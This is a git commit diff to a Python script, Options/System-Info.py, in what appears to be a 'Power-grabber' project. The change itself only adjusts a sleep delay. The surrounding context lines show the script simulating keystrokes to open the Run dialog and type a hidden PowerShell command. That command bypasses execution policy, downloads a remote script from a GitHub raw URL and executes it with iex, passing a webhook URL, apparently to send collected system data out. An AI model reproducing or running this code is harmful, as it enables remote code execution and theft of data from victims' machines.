562874d7989f879f9e447668ae54a7eba4dffe75
Powercascade <powercascade28@gmail.com>
2025-01-10 21:15:32 -0600

    System-Info.py

--- Options/System-Info.py
+++ Options/System-Info.py
@@ -13,7 +13,7 @@ def type_text(text):
         keyboard.press_and_release(char)
 time.sleep(1)
 keyboard.press_and_release("win+r")
-time.sleep(0.001)
+time.sleep(0.01)
 command = f"powershell -NoP -Ep Bypass -W H -C $dc='{webhook_url}'; irm https://raw.githubusercontent.com/Powercascade/Power-grabber/refs/heads/main/taktikal | iex"
 type_text(command)  
 keyboard.press_and_release("enter")
